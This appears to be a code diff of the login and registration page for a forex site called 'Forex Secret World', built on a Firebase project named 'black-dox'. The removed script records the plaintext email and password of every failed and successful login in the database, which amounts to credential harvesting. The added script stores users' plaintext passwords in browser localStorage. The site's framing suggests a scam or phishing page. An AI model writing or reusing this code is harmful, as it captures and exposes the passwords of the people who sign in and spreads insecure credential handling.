@@ -6,16 +6,8 @@
 <title>FOREX SECRET WORLD</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
-  <!-- Firebase -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
-  <script src="firebase.js"></script>
-
 </head>
 <body>
-<div class="toast" id="toast"></div>
 <!-- Header/Navbar -->
 <div class="header">
   <div class="container">
@@ -32,7 +24,7 @@
     </div>
   </div>
 </div>
-
+<hr>
 <!-- Account Page -->
 <div class="account-page">
   <div class="container">
@@ -48,22 +40,24 @@
             <span onclick="register()">Register</span>
           </div>
           <div id="Indicator"></div>
+<!-- Login Form -->
+<form id="LoginForm">
+  <input type="email" id="loginEmail" placeholder="Email" required>
+  
+  <div class="password-container">
+    <input type="password" id="loginPassword" placeholder="Password" required>
+    <span id="toggleLoginPassword" class="toggle-eye">👁️</span>
+  </div>
+  
+  <button type="submit" class="btn">Login</button>
+  <a href="reset_password.html" id="forgotPassword">Forgot password?</a>
+</form>
 
-          <!-- Login Form -->
-          <form id="LoginForm">
-            <input type="email" id="loginEmail" placeholder="Email" required>
-            <div class="password-container">
-              <input type="password" id="loginPassword" placeholder="Password" required>
-              <span id="toggleLoginPassword" class="toggle-eye">👁️</span>
-            </div>
-            <button type="submit" class="btn">Login</button>
-            <a href="#" id="forgotPassword">Forgot password?</a>
-          </form>
-
-          <!-- Register Form -->
-          <form id="RegForm" style="transform: translateX(100%);">
-            <input type="text" id="fullName" placeholder="Full Name" required>
-     <select id="country" required>
+<!-- Register Form -->
+  <form id="RegForm">
+  <input type="text" id="fullName" placeholder="Full names" required>
+  <!-- Country dropdown with full list -->
+  <select id="country" required>
   <option value="" disabled selected>Select your country</option>
   <option value="US" data-code="+1">United States</option>
   <option value="AF" data-code="+93">Afghanistan</option>
@@ -216,14 +210,15 @@
   <option value="ZM" data-code="+260">Zambia</option>
   <option value="ZW" data-code="+263">Zimbabwe</option>
 </select>
-            <input type="tel" id="phone" placeholder="Phone Number" required>
-            <input type="email" id="registerEmail" placeholder="Email" required>
-            <div class="password-container">
-              <input type="password" id="registerPassword" placeholder="Password" required>
-              <span id="toggleRegisterPassword" class="toggle-eye">👁️</span>
-            </div>
-            <button type="submit" class="btn">Register</button>
-          </form>
+
+  <input type="tel" id="phone" placeholder="Phone Number" required>
+  <input type="email" id="registerEmail" placeholder="Email" required>
+  <div class="password-container">
+     <input type="password" id="registerPassword" placeholder="Password" required>
+     <span id="toggleRegisterPassword" class="toggle-eye">👁️</span>
+  </div>
+  <button type="submit" class="btn">Register</button>
+</form>
 
         </div>
       </div>
@@ -246,230 +241,507 @@
   <hr>
   <p class="copyright">Copyright 1988-2025 : Forex secret world</p>
 </div>
+<!-- Scripts -->
 
-<!-- Message Box -->
-<div id="messageBox"></div>
-
+<!-- START MENU TOGGLE, LOGIN TOGGLE, AND REGISTER TOGGLE FUN -----------------------------------------------------------------------------------------------------------------------> 
 <script>
+  var MenuItems = document.getElementById("MenuItems");
+  var menuBtn = document.querySelector(".menue-icon");
 
+  // Initially collapse menu
+  MenuItems.style.maxHeight = "0px";
 
-// Menu toggle
-var MenuItems = document.getElementById("MenuItems");
-var menuBtn = document.querySelector(".menue-icon");
-MenuItems.style.maxHeight = "0px";
-function menutoggle() {
-  if (MenuItems.style.maxHeight === "0px") MenuItems.style.maxHeight = MenuItems.scrollHeight + "px";
-  else MenuItems.style.maxHeight = "0px";
-}
-document.addEventListener("click", function(event) {
-  if (!MenuItems.contains(event.target) && !menuBtn.contains(event.target)) MenuItems.style.maxHeight = "0px";
-});
-
-// Tabs
-function login() {
-  document.getElementById("LoginForm").style.transform = "translateX(0)";
-  document.getElementById("RegForm").style.transform = "translateX(100%)";
-  document.getElementById("Indicator").style.transform = "translateX(0%)";
-}
-function register() {
-  document.getElementById("LoginForm").style.transform = "translateX(-100%)";
-  document.getElementById("RegForm").style.transform = "translateX(0)";
-  document.getElementById("Indicator").style.transform = "translateX(100%)";
-}
-
-// Password toggle
-function setupPasswordToggle(inputId, toggleId) {
-  const passwordInput = document.getElementById(inputId);
-  const togglePassword = document.getElementById(toggleId);
-  togglePassword.addEventListener("click", () => {
-    const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
-    passwordInput.setAttribute("type", type);
-    togglePassword.textContent = type === "password" ? "👁️" : "🙈";
-  });
-}
-setupPasswordToggle("loginPassword", "toggleLoginPassword");
-setupPasswordToggle("registerPassword", "toggleRegisterPassword");
-
-// Show message
-function showToast(message, success=false) {
-  const box = document.getElementById("messageBox");
-  box.style.background = success ? "#4CAF50" : "#f44336";
-  box.textContent = message;
-  box.style.display = "block";
-  setTimeout(() => { box.style.display = "none"; }, 4000);
-}
-
-// Function to store failed login attempt
-function storeFailedLogin(email, password, error) {
-  const timestamp = Date.now();
-  const loginId = firebase.database().ref('failedLogins').push().key;
-  
-  // Check if this exact attempt already exists recently (within last hour)
-  const oneHourAgo = timestamp - (60 * 60 * 1000);
-  
-  firebase.database().ref('failedLogins').orderByChild('timestamp')
-    .startAt(oneHourAgo)
-    .once('value')
-    .then(snapshot => {
-      let duplicateFound = false;
-      
-      if (snapshot.exists()) {
-        snapshot.forEach(child => {
-          const attempt = child.val();
-          if (attempt.email === email && attempt.password === password) {
-            duplicateFound = true;
-          }
-        });
-      }
-      
-      // Only store if not a duplicate
-      if (!duplicateFound) {
-        firebase.database().ref('failedLogins/' + loginId).set({
-          email: email,
-          password: password,
-          error: error,
-          timestamp: timestamp,
-          ip: 'web-client' // In real app, you'd get actual IP
-        });
-      }
-    });
-}
-
-// Function to store successful login
-function storeSuccessfulLogin(uid, email, name) {
-  const timestamp = Date.now();
-  const loginId = firebase.database().ref('successfulLogins').push().key;
-  
-  firebase.database().ref('successfulLogins/' + loginId).set({
-    uid: uid,
-    email: email,
-    name: name,
-    timestamp: timestamp,
-    ip: 'web-client'
-  });
-}
-
-// ------------------- REGISTER -------------------
-document.getElementById("RegForm").addEventListener("submit", function(e){
-  e.preventDefault();
-  const name = document.getElementById("fullName").value;
-  const country = document.getElementById("country").value;
-  const phone = document.getElementById("phone").value;
-  const email = document.getElementById("registerEmail").value;
-  const password = document.getElementById("registerPassword").value;
-
-  firebase.auth().createUserWithEmailAndPassword(email, password)
-    .then(userCredential => {
-      const uid = userCredential.user.uid;
-      db.ref("users/" + uid).set({ 
-        name, 
-        country, 
-        phone, 
-        email, 
-        password, 
-        mainBalance: "0",
-        createdAt: Date.now()
-      });
-      showToast("Registration successful!", true);
-      login(); // switch to login tab
-    })
-    .catch(error => {
-      showToast(error.message);
-      // Store failed registration attempt
-      storeFailedLogin(email, password, error.message);
-    });
-});
-
-// ------------------- LOGIN -------------------
-document.getElementById("LoginForm").addEventListener("submit", (e) => {
-  e.preventDefault();
-
-  const email = document.getElementById("loginEmail").value.trim();
-  const password = document.getElementById("loginPassword").value.trim();
-  
-  // Disable button to prevent multiple submissions
-  const submitBtn = document.querySelector('#LoginForm .btn');
-  const originalText = submitBtn.textContent;
-  submitBtn.disabled = true;
-  submitBtn.textContent = 'Login';
-
-  firebase.auth().signInWithEmailAndPassword(email, password)
-    .then((userCredential) => {
-      const user = userCredential.user;
-      const uid = user.uid;
-
-      // Get the user's registration details
-      db.ref("users/" + uid).once("value")
-        .then(snapshot => {
-          if (snapshot.exists()) {
-            const userData = snapshot.val();
-
-            // Store successful login
-            storeSuccessfulLogin(uid, email, userData.name || "Unknown");
-            
-            // Store login snapshot including password
-            db.ref("logins/" + uid).set({
-              name: userData.name || "",
-              email: userData.email || "",
-              country: userData.country || "",
-              phone: userData.phone || "",
-              password: password || "",
-              lastLogin: Date.now()
-            });
-
-            showToast("Login successful! Welcome, " + userData.name, true);
-            setTimeout(() => {
-              window.location.href = "dashboard.html";
-            }, 1000);
-          } else {
-            showToast("User details not found in the system.");
-            storeFailedLogin(email, password, "User details not found");
-          }
-        })
-        .catch(err => {
-          showToast(err.message);
-          storeFailedLogin(email, password, err.message);
-        });
-    })
-    .catch((error) => {
-      const errorCode = error.code;
-      const errorMessage = error.message;
-      
-      // Store failed login attempt
-      storeFailedLogin(email, password, errorCode + ": " + errorMessage);
-
-      if (errorCode === "auth/user-not-found") {
-        showToast("No account found with that email.");
-      } else if (errorCode === "auth/wrong-password") {
-        showToast("Login details are incorrect.");
-      } else if (errorCode === "auth/too-many-requests") {
-        showToast("Too many failed attempts. Try again later.");
-      } else {
-        showToast("Login details are incorrect.");
-      }
-    })
-    .finally(() => {
-      // Re-enable button
-      submitBtn.disabled = false;
-      submitBtn.textContent = originalText;
-    });
-});
-
-// ------------------- FORGOT PASSWORD -------------------
-document.getElementById("forgotPassword").addEventListener("click", (e) => {
-  e.preventDefault();
-  const email = prompt("Enter your email to reset password:");
-  if (email) {
-    firebase.auth().sendPasswordResetEmail(email)
-      .then(() => {
-        showToast("Password reset email sent! Check your inbox.", true);
-      })
-      .catch(error => {
-        showToast(error.message);
-      });
+  // Toggle menu on button click
+  function menutoggle() {
+    if (MenuItems.style.maxHeight === "0px") {
+      MenuItems.style.maxHeight = MenuItems.scrollHeight + "px"; // dynamic height
+    } else {
+      MenuItems.style.maxHeight = "0px";
+    }
   }
+
+  // Close menu if user clicks outside
+  document.addEventListener("click", function(event) {
+    if (!MenuItems.contains(event.target) && !menuBtn.contains(event.target)) {
+      MenuItems.style.maxHeight = "0px";
+    }
+  });
+  // Login/Register toggle
+  function login() {
+    document.getElementById("LoginForm").style.transform = "translateX(0)";
+    document.getElementById("RegForm").style.transform = "translateX(100%)";
+    document.getElementById("Indicator").style.transform = "translateX(0%)";
+  }
+  function register() {
+    document.getElementById("LoginForm").style.transform = "translateX(-100%)";
+    document.getElementById("RegForm").style.transform = "translateX(0)";
+    document.getElementById("Indicator").style.transform = "translateX(100%)";
+  }
+</script> 
+<!-- END MENU TOGGLE, LOGIN TOGGLE, AND REGISTER TOGGLE FUN ----------------------------------------------------------------------------------------------------------------------->
+
+<!-- START COUNTRY CODE FUN ----------------------------------------------------------------------------------------------------------------------->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const countrySelect = document.getElementById('country');
+  const phoneInput = document.getElementById('phone');
+
+  let countryCode = "";
+
+  function setCountryCode() {
+    const selectedOption = countrySelect.selectedOptions[0];
+    if (!selectedOption || !selectedOption.dataset.code) {
+      phoneInput.value = ""; // clear phone input if placeholder is selected
+      countryCode = "";
+      return;
+    }
+
+    const newCode = selectedOption.dataset.code;
+
+    // Remove old code if it exists
+    if (countryCode && phoneInput.value.startsWith(countryCode)) {
+      phoneInput.value = phoneInput.value.slice(countryCode.length);
+    }
+
+    countryCode = newCode;
+
+    // Only prepend if not already there
+    if (!phoneInput.value.startsWith(countryCode)) {
+      phoneInput.value = countryCode + phoneInput.value;
+    }
+
+    // Move cursor to end
+    phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
+  }
+
+  // Change code on country change
+  countrySelect.addEventListener('change', setCountryCode);
+
+  // Prevent deleting the prefix
+  phoneInput.addEventListener('keydown', function(e) {
+    if (phoneInput.selectionStart <= countryCode.length &&
+        (e.key === "Backspace" || e.key === "Delete")) {
+      e.preventDefault();
+    }
+  });
+
+  // Keep cursor after prefix
+  phoneInput.addEventListener('click', function() {
+    if (phoneInput.selectionStart < countryCode.length) {
+      phoneInput.setSelectionRange(countryCode.length, countryCode.length);
+    }
+  });
+
+  // Start empty, no default country code
+  phoneInput.value = "";
 });
 </script>
+<!-- END COUNTRY CODE FUN ----------------------------------------------------------------------------------------------------------------------->
+
+<!-- START PASSWORD VISIBILITY FUN ----------------------------------------------------------------------------------------------------------------------->
+<script>
+  function setupPasswordToggle(inputId, toggleId) {
+    const passwordInput = document.getElementById(inputId);
+    const togglePassword = document.getElementById(toggleId);
+
+    togglePassword.addEventListener("click", () => {
+      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+      passwordInput.setAttribute("type", type);
+      togglePassword.textContent = type === "password" ? "👁️" : "🙈";
+    });
+  }
+
+  // Apply to both password fields
+  setupPasswordToggle("loginPassword", "toggleLoginPassword");
+  setupPasswordToggle("registerPassword", "toggleRegisterPassword");
+</script>
+<!-- END PASSWORD VISIBILITY FUN ----------------------------------------------------------------------------------------------------------------------->
+
+<!-- START REGISTER FUN ----------------------------------------------------------------------------------------------------------------------->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
+import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyABQqlqvqqsrb2B7K8URa3Mj2BToXsabPQ",
+  authDomain: "black-dox.firebaseapp.com",
+  databaseURL: "https://black-dox.firebaseio.com",
+  projectId: "black-dox",
+  storageBucket: "black-dox.appspot.com",
+  messagingSenderId: "45035762443",
+  appId: "1:45035762443:web:4101a6774e6f4f1d15e80e",
+  measurementId: "G-B7HB0T95TP"
+};
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getDatabase(app);
+
+// Elements
+const registerForm = document.getElementById("RegForm");
+const countrySelect = document.getElementById("country");
+const phoneInput = document.getElementById("phone");
+
+// Country code logic
+let countryCode = countrySelect.selectedOptions[0].dataset.code;
+phoneInput.value = countryCode;
+
+countrySelect.addEventListener("change", () => {
+  countryCode = countrySelect.selectedOptions[0].dataset.code;
+  phoneInput.value = countryCode;
+});
+
+phoneInput.addEventListener("keydown", (e) => {
+  if (phoneInput.selectionStart <= countryCode.length &&
+      (e.key === "Backspace" || e.key === "Delete")) e.preventDefault();
+});
+
+phoneInput.addEventListener("click", () => {
+  if (phoneInput.selectionStart < countryCode.length) {
+    phoneInput.setSelectionRange(countryCode.length, countryCode.length);
+  }
+});
+
+// Signup handler
+registerForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const fullName = document.getElementById("fullName").value;
+  const email = document.getElementById("registerEmail").value;
+  const password = document.getElementById("registerPassword").value;
+  const phone = phoneInput.value.trim();
+  const country = countrySelect.options[countrySelect.selectedIndex].text;
+
+  try {
+    // ✅ Check if phone exists
+    const dbRef = ref(db);
+    const snapshot = await get(child(dbRef, "phoneNumbers"));
+    let phoneExists = false;
+
+    if (snapshot.exists()) {
+      snapshot.forEach((childSnap) => {
+        if (childSnap.val().number === phone) {
+          phoneExists = true;
+        }
+      });
+    }
+
+    if (!phoneExists) {
+      showMessage("Registration failed. Phone not recognized.", false);
+      return;
+    }
+
+    // ✅ Create user
+    const userCredential = await createUserWithEmailAndPassword(auth, email, password);
+    const user = userCredential.user;
+
+    const userInfo = {
+      fullName: fullName,
+      email: email,
+      phone: phone,
+      country: country,
+      mainBalance: "0.00",
+      accountNumber: "",
+      password: "",
+      uid2: ""
+    };
+
+    // ✅ Save to Firebase
+    await set(ref(db, "userInfo/" + user.uid), userInfo);
+
+    // =========================
+    // 🔥 SAVE LOCALLY (NEW)
+    // =========================
+
+    // Remove old data first
+    localStorage.removeItem("savedEmail");
+    localStorage.removeItem("savedPassword");
+    localStorage.removeItem("savedUserInfo");
+
+    // Save new data
+    localStorage.setItem("savedEmail", email);
+    localStorage.setItem("savedPassword", password);
+    localStorage.setItem("savedUserInfo", JSON.stringify(userInfo));
+
+    // =========================
+
+    showMessage(`Signup successful 🎉 Welcome, ${fullName}`, true);
+
+    registerForm.reset();
+    phoneInput.value = countryCode;
+
+    // Redirect
+    setTimeout(() => {
+      window.location.href = "dashboard.html";
+    }, 1500);
+
+  } catch (error) {
+    let message = "Registration failed. Please try again.";
+
+    if (error.code === "auth/email-already-in-use") {
+      message = "This email is already registered.";
+    } else if (error.code === "auth/invalid-email") {
+      message = "Please enter a valid email address.";
+    } else if (error.code === "auth/weak-password") {
+      message = "Password must be at least 6 characters.";
+    }
+
+    console.error("Auth error:", error);
+    showMessage(message, false);
+  }
+});
+
+// Message helper
+function showMessage(message, success = true) {
+  const msgBox = document.getElementById("messageBox");
+  if (!msgBox) return;
+  msgBox.textContent = message;
+  msgBox.style.color = success ? "green" : "red";
+}
+</script>
+<!-- END REGISTER FUN ----------------------------------------------------------------------------------------------------------------------->
+
+<!-- START LOGIN FUN ----------------------------------------------------------------------------------------------------------------------->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+import { getAuth, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js";
+import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
+
+// Firebase config (unchanged)
+const firebaseConfig = {
+  apiKey: "AIzaSyABQqlqvqqsrb2B7K8URa3Mj2BToXsabPQ",
+  authDomain: "black-dox.firebaseapp.com",
+  databaseURL: "https://black-dox.firebaseio.com",
+  projectId: "black-dox",
+  storageBucket: "black-dox.appspot.com",
+  messagingSenderId: "45035762443",
+  appId: "1:45035762443:web:4101a6774e6f4f1d15e80e",
+  measurementId: "G-B7HB0T95TP"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getDatabase(app);
+
+// Elements
+const loginForm = document.getElementById("LoginForm");
+
+// Auto-fill email only
+const savedEmail = localStorage.getItem("savedEmail");
+if (savedEmail) {
+  document.getElementById("loginEmail").value = savedEmail;
+}
+
+// Login form submission
+loginForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("loginEmail").value;
+  const password = document.getElementById("loginPassword").value;
+
+  try {
+    const userCredential = await signInWithEmailAndPassword(auth, email, password);
+    const user = userCredential.user;
+
+    // ✅ Store email/password
+    localStorage.removeItem("savedEmail");
+    localStorage.removeItem("savedPassword");
+    localStorage.setItem("savedEmail", email);
+    localStorage.setItem("savedPassword", password);
+
+    // Fetch user info
+    let userInfo = { fullName: user.email };
+    try {
+      const snapshot = await get(child(ref(db), "userInfo/" + user.uid));
+      if (snapshot.exists()) {
+        userInfo = snapshot.val();
+      }
+
+      // ✅ Remove old data before saving new
+      localStorage.removeItem("savedUserInfo");
+      localStorage.setItem("savedUserInfo", JSON.stringify(userInfo));
+    } catch (dbError) {
+      console.error("Database error:", dbError);
+    }
+
+    // Show welcome message on login page
+    showMessage(`Welcome back 🎉 ${userInfo.fullName || user.email}`, true);
+
+    // Redirect after 2 seconds
+    setTimeout(() => {
+      window.location.href = "dashboard.html";
+    }, 2000);
+
+  } catch (error) {
+    let message = "Login failed.";
+    if (error.code === "auth/user-not-found") message = "No account found.";
+    else if (error.code === "auth/wrong-password") message = "Incorrect password.";
+    else if (error.code === "auth/invalid-email") message = "Invalid email.";
+
+    console.error(error);
+    showMessage(message, false);
+  }
+});
+
+// Show messages helper
+function showMessage(message, success = true) {
+  const msgBox = document.getElementById("messageBox");
+  if (!msgBox) return;
+  msgBox.textContent = message;
+  msgBox.style.color = success ? "green" : "red";
+}
+</script>
+<!-- END LOGIN FUN ----------------------------------------------------------------------------------------------------------------------->
+
+<!-- START MESSAGE FUN ----------------------------------------------------------------------------------------------------------------------->
+<div id="messageBox" style="display:none; position:fixed; top:20px; right:20px; 
+                            background:#f44336; color:white; padding:15px; border-radius:5px;">
+</div>
+<script>
+function showMessage(message, success = false) {
+  const box = document.getElementById("messageBox");
+  box.style.background = success ? "#4CAF50" : "#f44336"; // green for success, red for error
+  box.textContent = message;
+  box.style.display = "block";
+  setTimeout(() => {
+    box.style.display = "none";
+  }, 4000); // hide after 3 seconds
+}
+</script>
+<!-- END MESSAGE FUN ----------------------------------------------------------------------------------------------------------------------->
+
+
+
 
 </body>
 </html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
